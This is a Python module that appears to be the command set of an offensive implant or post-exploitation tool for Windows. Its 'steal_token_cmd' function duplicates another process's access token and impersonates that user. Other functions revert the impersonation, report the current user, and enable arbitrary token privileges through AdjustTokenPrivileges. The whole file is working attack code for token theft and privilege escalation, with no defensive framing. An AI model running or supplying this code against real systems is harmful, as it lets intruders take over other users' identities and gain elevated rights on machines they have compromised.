import os
import ctypes


def steal_token_cmd(pid) -> str:
    if os.name != 'nt':
        return '[-] Token operations are Windows-only'
    try:
        pid = int(pid)
    except (ValueError, TypeError):
        return '[-] Invalid PID'

    import ctypes

    try:
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32
    except Exception:
        return '[-] Windows API not available'

    try:
        h_process = kernel32.OpenProcess(0x0400, False, pid)
        if not h_process:
            return f'[-] Cannot open process PID {pid}'

        h_token = ctypes.c_void_p()
        if not advapi32.OpenProcessToken(h_process, 0x0008 | 0x0002, ctypes.byref(h_token)):
            kernel32.CloseHandle(h_process)
            return f'[-] Cannot open token for PID {pid}'

        h_dup = ctypes.c_void_p()
        if not advapi32.DuplicateTokenEx(h_token, 0x0004 | 0x0008, None, 2, 1, ctypes.byref(h_dup)):
            kernel32.CloseHandle(h_token)
            kernel32.CloseHandle(h_process)
            return '[-] Token duplication failed'

        if not advapi32.ImpersonateLoggedOnUser(h_dup):
            kernel32.CloseHandle(h_dup)
            kernel32.CloseHandle(h_token)
            kernel32.CloseHandle(h_process)
            return '[-] Token impersonation failed'

        kernel32.CloseHandle(h_dup)
        kernel32.CloseHandle(h_token)
        kernel32.CloseHandle(h_process)

        import subprocess
        user = subprocess.check_output('whoami', shell=True).decode().strip()
        return f'[+] Token stolen from PID {pid}, running as: {user}'
    except Exception as e:
        return f'[-] Token steal failed: {str(e)}'


def revert_token_cmd() -> str:
    if os.name != 'nt':
        return '[-] Token operations are Windows-only'
    try:
        ctypes.windll.advapi32.RevertToSelf()
        return '[+] Reverted to self'
    except Exception as e:
        return f'[-] Revert failed: {str(e)}'


def whoami_cmd() -> str:
    try:
        import subprocess
        user = subprocess.check_output('whoami', shell=True).decode().strip()
        return f'[*] Current user: {user}'
    except Exception:
        try:
            import pwd
            return f'[*] Current user: {pwd.getpwuid(os.geteuid()).pw_name}'
        except Exception:
            return f'[*] User: {os.environ.get("USER", "unknown")}'


def enable_privilege_cmd(priv: str) -> str:
    if os.name != 'nt':
        if os.geteuid() == 0:
            return '[+] Already root — all privileges available'
        return '[-] Privilege enable is Windows-only (use sudo on Linux)'

    import ctypes
    from ctypes import wintypes

    try:
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32

        class LUID(ctypes.Structure):
            _fields_ = [
                ('LowPart', wintypes.DWORD),
                ('HighPart', wintypes.LONG),
            ]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [
                ('Luid', LUID),
                ('Attributes', wintypes.DWORD),
            ]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [
                ('PrivilegeCount', wintypes.DWORD),
                ('Privileges', LUID_AND_ATTRIBUTES * 1),
            ]

        h_token = ctypes.c_void_p()
        if not advapi32.OpenProcessToken(
            kernel32.GetCurrentProcess(), 0x0020 | 0x0008, ctypes.byref(h_token)
        ):
            return '[-] Cannot open process token'

        luid = LUID()
        if not advapi32.LookupPrivilegeValueW(None, priv, ctypes.byref(luid)):
            kernel32.CloseHandle(h_token)
            return f'[-] Privilege not found: {priv}'

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = 0x2

        ok = advapi32.AdjustTokenPrivileges(
            h_token, False, ctypes.byref(tp),
            ctypes.sizeof(TOKEN_PRIVILEGES), None, None
        )
        kernel32.CloseHandle(h_token)
        if ok:
            return f'[+] Privilege enabled: {priv}'
        return f'[-] Failed to enable: {priv}'
    except Exception as e:
        return f'[-] Privilege error: {str(e)}'
